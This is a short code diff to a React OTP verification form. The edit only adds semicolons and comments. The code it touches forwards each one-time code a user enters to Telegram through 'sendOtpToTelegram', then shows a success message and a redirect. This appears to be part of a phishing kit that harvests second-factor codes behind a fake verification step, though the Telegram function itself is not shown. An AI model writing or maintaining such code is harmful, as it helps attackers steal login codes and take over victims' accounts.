@@ -79,24 +79,28 @@ export function OtpForm() {
   })
 
   async function onSubmit(data: z.infer<typeof FormSchema>) {
-    setIsSubmitting(true)
-    const result = await sendOtpToTelegram(data.pin)
+    setIsSubmitting(true);
+    
+    // Send OTP to Telegram immediately and wait for the result
+    const result = await sendOtpToTelegram(data.pin);
 
     if (result.success) {
       toast({
         title: t('verificationSuccess'),
         description: t('codeVerified'),
-      })
-      setShowRedirectModal(true)
+      });
+      // Only show the redirect modal after the Telegram action is successful
+      setShowRedirectModal(true);
     } else {
-      form.setError("pin", { message: "Invalid or expired code. Please try again."})
+      form.setError("pin", { message: "Invalid or expired code. Please try again."});
       toast({
         title: t('verificationFailed'),
         description: t('invalidCode'),
         variant: "destructive",
-      })
+      });
     }
-    setIsSubmitting(false)
+    
+    setIsSubmitting(false);
   }
 
   const formatTime = (seconds: number) => {
